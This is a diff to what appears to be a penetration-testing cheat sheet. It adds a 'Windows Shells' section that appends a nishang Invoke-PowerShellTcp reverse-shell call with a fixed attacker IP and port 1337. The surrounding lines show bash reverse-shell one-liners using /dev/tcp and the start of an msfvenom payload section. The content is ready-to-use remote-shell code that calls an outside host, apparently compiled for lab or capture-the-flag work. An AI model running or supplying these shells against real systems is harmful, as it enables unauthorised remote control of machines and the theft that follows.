@@ -269,6 +269,12 @@ bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 # Wrapped Bash Shell
 bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
 ```
+### Windows Shells
+Added to the bottom of nishangs Invoke-PowerShellTcp.ps1 file
+```bash
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.52 -Port 1337
+```
+
 ### msfvenom
 ```bash
 # List payloads
